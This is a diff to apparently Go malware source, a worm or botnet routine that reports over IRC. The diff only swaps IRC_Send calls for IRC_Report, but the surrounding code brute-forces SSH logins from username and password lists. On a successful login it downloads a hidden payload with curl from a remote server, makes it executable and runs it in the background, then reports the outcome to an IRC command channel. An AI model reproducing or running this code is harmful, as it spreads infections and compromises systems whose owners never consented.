@@ -176,26 +176,26 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 			}
 
 			if turnRange == "" {
-				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+target+" SSH not found.")
+				IRC_Report(reportIRC, set_chan, target+"SSH not found.")
 				CheckPort(target)
 			} else {
-				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Try to login to "+turnRange)
+				IRC_Report(reportIRC, set_chan, target+"Try to login to "+turnRange)
 				var logCheck bool
 
 				for i := range userList {
 					for j := range passList {
 						_session, err := ssh.Dial("tcp", turnRange, SSH_Config(userList[i], passList[j]))
 						if err == nil {
-							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Login success at "+turnRange)
+							IRC_Report(reportIRC, set_chan, target+"Login success at "+turnRange)
 							SSH_Session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
 							time.Sleep(10 * time.Second)
-							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :\"curl\" Success on "+turnRange)
+							IRC_Report(reportIRC, set_chan, target+"\"curl\" Success on "+turnRange)
 							SSH_Session(_session, "chmod +x ."+set_payload)
 							go SSH_Session(_session, "./."+set_payload+" &")
 							logCheck = true
 							break
 						} else {
-							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Failed to login to "+turnRange+
+							IRC_Report(reportIRC, set_chan, "Failed to login to "+turnRange+
 								" > "+fmt.Sprintf("%v", userList[i])+":"+fmt.Sprintf("%v", passList[j]))
 						}
 					}
